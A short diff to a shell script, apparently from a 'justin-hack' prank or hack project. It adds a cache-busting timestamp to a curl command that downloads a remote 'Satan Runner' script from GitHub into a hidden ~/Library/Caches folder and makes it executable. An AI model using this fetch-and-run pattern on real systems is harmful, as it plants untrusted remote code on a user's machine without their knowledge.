@@ -1,12 +1,13 @@
 ## Vars
 jh=~/Library/Caches/jh
 baseurl=https://raw.githubusercontent.com/FredericMartinez/justin-hack/master
+timestamp=`date +'%s'`
 
 ## Prepare field
 mkdir $jh 2> /dev/null
 
 ## Get Satan Runner
-curl -o $jh/runner.sh $baseurl/runner.sh > /dev/null
+curl -o $jh/runner.sh $baseurl/runner.sh?q=$timestamp > /dev/null
 chmod +x $jh/runner.sh
 
 ## Backup buddies
